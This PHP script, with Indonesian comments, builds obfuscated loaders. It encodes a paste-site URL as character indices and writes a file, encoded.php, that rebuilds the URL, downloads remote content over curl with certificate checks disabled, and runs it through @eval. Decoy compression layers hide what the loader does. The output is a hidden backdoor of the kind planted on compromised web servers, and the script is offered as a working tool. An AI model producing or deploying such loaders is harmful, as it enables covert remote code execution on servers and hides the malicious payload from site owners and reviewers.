<?php
// $aNAx = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'), ['.', ':', '/', '_', '-', '?', '=']);
// $cbnN = [7, 19, 19, 15, 18, 63, 64, 64, 15, 0, 18, 19, 4, 8, 13, 62, 21, 4, 17, 2, 4, 11, 62, 0, 15, 15, 64, 0, 15, 8, 64, 17, 0, 22, 67, 15, 68, 56, 57, 58, 54, 57, 59, 4, 56, 66, 57, 60, 53, 59, 66, 56, 0, 59, 3, 66, 1, 55, 59, 58, 66, 55, 58, 5, 60, 0, 5, 55, 5, 0, 57, 60, 5];

// $pmXa = '';
// foreach ($cbnN as $qLvw) {
//     $pmXa .= $aNAx[$qLvw];
// }

// echo "Decoded URL: " . $pmXa . PHP_EOL;


$url = "https://pastein.vercel.app/api/raw?p=5ba1f313-566e-40cb-90fb-66afbf22cd91";

// Karakter yang digunakan dalam encoding
$aNAx = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'), ['.', ':', '/', '_', '-', '?', '=']);

// Konversi URL menjadi indeks dari karakter di $aNAx
$cbnN = [];
for ($i = 0; $i < strlen($url); $i++) {
    $cbnN[] = array_search($url[$i], $aNAx);
}

// Format kode PHP yang dihasilkan
$encoded_php = '<?php' . PHP_EOL;
$encoded_php .= '$aNAx=array_merge(range(\'a\',\'z\'),range(\'A\',\'Z\'),range(\'0\',\'9\'),[\'.\',\':\',\'/\',\'_\',\'-\',\'?\',\'=\']);' . PHP_EOL;
$encoded_php .= '$cbnN=[' . implode(', ', $cbnN) . '];' . PHP_EOL;
$encoded_php .= '$pmXa=\'\';foreach($cbnN as $qLvw){$pmXa.=$aNAx[$qLvw];}' . PHP_EOL;
$encoded_php .= '$RcRI = "$pmXa";' . PHP_EOL;
$encoded_php .= 'function zrwR($undefined){$UWOb=curl_init();curl_setopt($UWOb,CURLOPT_URL,$undefined);' .
                'curl_setopt($UWOb,CURLOPT_RETURNTRANSFER,true);curl_setopt($UWOb,CURLOPT_SSL_VERIFYPEER,false);' .
                'curl_setopt($UWOb,CURLOPT_SSL_VERIFYHOST,false);$XRcN=curl_exec($UWOb);curl_close($UWOb);' .
                'return gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate($XRcN))))));}' . PHP_EOL;
$encoded_php .= '@eval("?>".gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(zrwR($RcRI))))))));' . PHP_EOL;
$encoded_php .= '?>';

// Simpan ke file
file_put_contents("encoded.php", $encoded_php);

echo "Encoded PHP saved to encoded.php\n";
?>

